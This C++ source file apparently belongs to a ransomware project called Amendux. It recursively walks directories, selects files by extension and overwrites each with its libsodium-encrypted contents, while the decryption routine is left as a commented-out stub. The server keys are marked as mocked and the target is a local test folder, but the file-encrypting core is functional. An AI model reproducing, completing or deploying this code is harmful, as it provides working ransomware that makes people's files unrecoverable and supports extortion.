#include "stdafx.h"
#include "Log.h"
#include "Encrypt.h"

#include <sstream>

using namespace Amendux;

Encrypt::Encrypt()
{
	/* PK Send to us */
	crypto_box_keypair(serverPublicKey, serverSecretKey); // TODO: This is mocked

	Log::Instance()->write(L"Encrypt", L"Initialize encryptor module");
}


void Encrypt::genLocalKeypair()
{
	/* We generate this once */
	crypto_box_keypair(clientPublicKey, clientSecretKey);

	Log::Instance()->write(L"Encrypt", L"Generate client keypair");
}


void Encrypt::setLocalKeypair(unsigned char *publickey, unsigned char *privatekey)
{
	memcpy(clientPublicKey, publickey, crypto_box_PUBLICKEYBYTES);
	memcpy(clientSecretKey, privatekey, crypto_box_SECRETKEYBYTES);
}


void Encrypt::getDirFiles(std::wstring szDir)
{
	HANDLE dir;
	WIN32_FIND_DATA fData;

	if ((dir = FindFirstFile((szDir + L"\\*").c_str(), &fData)) == INVALID_HANDLE_VALUE)
		return; /* No files found */

	do {
		const std::wstring fName = fData.cFileName;
		const std::wstring fullfName = szDir + L"\\" + fName;
		const bool isDirectory = (fData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;

		if (fName.size() == 1 && fName.at(0) == '.')
			continue;

		if (fName.size() == 2 && fName == L"..")
			continue;

		if (isDirectory)
			getDirFiles(fullfName);

		if (isExtensionMatch(fullfName))
			boxSeal(fullfName);

	} while (FindNextFile(dir, &fData));

	FindClose(dir);
}


bool Encrypt::isExtensionMatch(const std::wstring& file)
{
	std::wstring ext = file.substr(file.find_last_of(L".") + 1);

	for (unsigned int i = 0; i < sizeof(extensions) / sizeof(extensions[0]); i++) {
		size_t szExt = strlen(extensions[i]);
		if (ext.size() != szExt)
			continue;

		if (std::equal(extensions[i], extensions[i] + szExt, ext.begin()))
			return true;
	}

	return false;
}


bool Encrypt::boxSeal(std::wstring file)
{
	std::fstream rawFile;
	std::wstringstream wss;
	unsigned char nonce[crypto_box_NONCEBYTES];

	/* Generate random vector */
	randombytes_buf(nonce, sizeof(nonce));

	rawFile.open(file, std::fstream::in | std::fstream::out | std::fstream::binary);
	rawFile.seekg(0, std::fstream::end);

	size_t bytea_len = rawFile.tellg();
	unsigned char *bytea = new unsigned char[bytea_len];

	wss << "File: " << file << ", size: " << bytea_len;
	Log::Instance()->write(L"Encrypt", wss.str());

	rawFile.seekg(0, std::fstream::beg);
	rawFile.read((char *)bytea, bytea_len);

	/* Encrypt file byte array */
	unsigned char *ciphertext = new unsigned char[crypto_box_MACBYTES + bytea_len];
	if (crypto_box_easy(ciphertext, bytea, bytea_len, nonce, serverPublicKey, clientSecretKey) != 0) {
		wss.clear();
		wss << "File: " << file << " encrypted failed";
		Log::Instance()->write(L"Encrypt", wss.str());
		return false;
	}

	rawFile.seekp(0, std::fstream::beg);
	rawFile.write((char *)ciphertext, crypto_box_MACBYTES + bytea_len);

	delete bytea;
	delete ciphertext;

	rawFile.close();

	return true;
}


bool Encrypt::boxUnseal()
{
	//unsigned char decrypted [MESSAGE_LEN];
	//if (crypto_box_open_easy(decrypted, ciphertext, CIPHERTEXT_LEN, nonce, clientPublicKey, serverSecretKey) != 0) {
	/* message for Bob pretending to be from Alice has been forged! */
	//}
	return false;
}


Encrypt::~Encrypt()
{
	ZeroMemory(serverPublicKey, crypto_box_PUBLICKEYBYTES);
	ZeroMemory(serverSecretKey, crypto_box_SECRETKEYBYTES);
	ZeroMemory(clientPublicKey, crypto_box_PUBLICKEYBYTES);
	ZeroMemory(clientSecretKey, crypto_box_SECRETKEYBYTES);

	Log::Instance()->write(L"Encrypt", L"Terminate encryptor module");
}


void Encrypt::Run()
{
	Log::Instance()->write(L"Encrypt", L"Run encryptor module");

	this->getDirFiles(L"C:\\Users\\yoric\\Documents\\CRYPT");
}


void Encrypt::rot13(char str[])
{
	for (int i = 0; str[i] != '\0'; i++) {
		if (str[i] >= 'a' && str[i] <= 'm') {
			str[i] += 13;
		}

		else if (str[i] > 'm' && str[i] <= 'z') {
			str[i] -= 13;
		}

		else if (str[i] >= 'A' && str[i] <= 'M') {
			str[i] += 13;
		}

		else if (str[i] > 'M' && str[i] <= 'Z') {
			str[i] -= 13;
		}
	}
}
